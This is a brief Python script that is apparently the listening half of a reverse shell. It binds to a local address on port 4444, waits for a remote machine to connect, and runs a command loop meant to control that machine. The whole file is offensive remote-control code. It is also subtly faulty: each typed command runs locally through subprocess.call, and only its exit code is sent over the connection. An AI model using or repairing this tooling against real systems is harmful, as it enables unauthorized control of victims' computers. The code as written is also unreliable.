#!/usr/bin/python



import socket
import subprocess

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.1.3", 4444))
listener.listen(0)
print("[+] Waiting for incoming connections")
connection, address = listener.accept()
print("[+] Connection established with " + str(address))

while True:
    
    command = input(">> ")
    
    command = subprocess.call(command)
    command = str(command)
    connection.send(command.encode('ASCII'))
    result = connection.recv(1024)
    print(result)